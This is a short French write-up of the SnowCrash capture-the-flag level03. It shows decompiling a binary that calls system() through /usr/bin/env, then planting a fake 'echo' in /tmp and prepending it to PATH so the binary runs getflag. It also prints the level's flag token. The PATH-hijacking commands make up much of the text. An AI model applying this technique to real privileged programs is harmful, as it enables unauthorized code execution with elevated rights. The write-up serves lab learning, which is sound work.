# Recherche des fichiers disponibles

Avec la commande ls on trouve le binaire **level03** dans le home de l'utilisateur **level03**.

```bash
level03@SnowCrash:~$ ls
level03
```

En décompilant le binaire via le site [dogbolt](https://dogbolt.org)
On observe : `return system("/usr/bin/env echo Exploit me");`

Ce code utilise /usr/bin/env pour exécuter la commande echo. Cela signifie que le système va rechercher le binaire echo dans les chemins définis dans la variable d’environnement $PATH.

Une première idée aurait été de remplacer directement /bin/echo par /bin/getflag, afin d'exécuter getflag à la place :

```bash
level03@SnowCrash:~$ mv /bin/getflag /bin/echo
mv: try to overwrite `/bin/echo', overriding mode 0755 (rwxr-xr-x)? y
mv: cannot move `/bin/getflag' to `/bin/echo': Permission denied
```

Cette méthode échoue car l'utilisateur level03 ne possède pas les droits suffisants pour modifier les fichiers système.

On crée alors un faux binaire echo dans un répertoire temporaire, qui exécute simplement /bin/getflag

```bash
level03@SnowCrash:~$ mkdir -p /tmp/t
level03@SnowCrash:~$ echo /bin/getflag > /tmp/t/echo
level03@SnowCrash:~$ chmod +x /tmp/t/echo
```

Puis on modifie la variable $PATH pour que notre faux echo soit prioritaire :
```bash
level03@SnowCrash:~$ export PATH=/tmp/t:$PATH
```

En lançant le binaire level03, notre faux echo est utilisé, ce qui déclenche l’exécution de getflag
```bash
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
